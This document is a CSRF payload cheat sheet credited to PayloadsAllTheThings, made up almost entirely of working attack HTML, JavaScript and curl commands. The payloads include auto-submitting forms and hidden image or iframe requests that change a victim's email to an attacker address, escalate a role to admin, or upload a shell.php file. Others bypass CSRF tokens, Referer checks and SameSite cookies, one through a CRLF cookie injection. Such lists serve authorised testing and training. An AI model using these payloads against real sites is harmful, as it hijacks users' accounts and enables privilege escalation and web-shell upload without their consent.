# CSRF (Cross-Site Request Forgery) Payloads

> Source: PayloadsAllTheThings — Cross-Site Request Forgery

## Auto-Submit Forms

### GET-Based CSRF

```html
<!-- Image tag triggers GET request -->
<img src="http://target.com/api/changeEmail?email=attacker@evil.com">

<!-- Hidden iframe -->
<iframe src="http://target.com/api/deleteAccount?confirm=true" style="display:none"></iframe>
```

### POST-Based CSRF (Auto-Submit)

```html
<form id="csrf" action="http://target.com/api/changeEmail" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm" value="true">
</form>
<script>document.getElementById("csrf").submit();</script>
```

### POST with Enctype (Bypass Content-Type Checks)

```html
<form id="csrf" action="http://target.com/api/setUsername" enctype="text/plain" method="POST">
  <input name="username" type="hidden" value="hacked">
</form>
<script>document.getElementById("csrf").submit();</script>
```

## JSON CSRF

### XHR-Based

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/api/changeRole", true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.withCredentials = true;
xhr.send('{"role":"admin"}');
</script>
```

### Form-Based JSON (Content-Type Trick)

```html
<form id="csrf" action="http://target.com/api/changeRole" enctype="text/plain" method="POST">
  <input type="hidden" name='{"role":"admin","extra":"' value='"}'>
</form>
<script>document.getElementById("csrf").submit();</script>
```

This sends: `{"role":"admin","extra":"="}` which is valid JSON.

### Fetch API

```html
<script>
fetch('http://target.com/api/changeRole', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: '{"role":"admin"}'
});
</script>
```

Note: This triggers a pre-flight if Content-Type is `application/json`. Works only if CORS allows it.

## File Upload CSRF

```html
<script>
function launch() {
  const dt = new DataTransfer();
  const file = new File(["malicious content"], "shell.php");
  dt.items.add(file);
  document.forms[0][0].files = dt.files;
  document.forms[0].submit();
}
</script>
<form method="post" action="http://target.com/upload" enctype="multipart/form-data" style="display:none">
  <input type="file" name="file">
</form>
<button onclick="launch()">Click</button>
```

## Token Bypass Techniques

### Remove Token Entirely

```html
<!-- Some apps only validate token if present, skip validation if absent -->
<form action="http://target.com/api/action" method="POST">
  <!-- No csrf_token field at all -->
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

### Method Switch (POST to GET)

```html
<!-- App validates CSRF token on POST but not GET -->
<img src="http://target.com/api/changeEmail?email=attacker@evil.com">
```

### Token Not Tied to Session

```html
<!-- Use attacker's own valid CSRF token if tokens aren't session-bound -->
<form action="http://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="ATTACKER_VALID_TOKEN">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

### Duplicate Cookie Pattern Bypass

If the app checks that a cookie value matches a form parameter:

```html
<!-- Inject cookie via CRLF or subdomain, then match in form -->
<img src="http://target.com/path%0d%0aSet-Cookie:csrf=fake">
<form action="http://target.com/api/action" method="POST">
  <input type="hidden" name="csrf" value="fake">
</form>
```

### Referer Header Bypass

```html
<!-- Strip Referer entirely -->
<meta name="referrer" content="no-referrer">
<form action="http://target.com/api/action" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<!-- Include target domain in Referer path -->
<!-- Host PoC at: https://attacker.com/target.com/csrf.html -->
```

## SameSite Cookie Bypass

```html
<!-- SameSite=Lax allows GET requests from top-level navigation -->
<a href="http://target.com/api/action?email=attacker@evil.com">Click here</a>

<!-- Force top-level navigation with window.open -->
<script>window.open('http://target.com/api/action?email=attacker@evil.com')</script>
```

## Useful Curl for Testing

```bash
# Check if endpoint accepts requests without CSRF token
curl -s -X POST http://target.com/api/action \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "email=test@test.com"

# Check if endpoint accepts GET instead of POST
curl -s "http://target.com/api/action?email=test@test.com" \
  -H "Cookie: session=VICTIM_SESSION"

# Check Referer validation
curl -s -X POST http://target.com/api/action \
  -H "Cookie: session=VICTIM_SESSION" \
  -H "Referer: https://evil.com/" \
  -d "email=test@test.com"
```
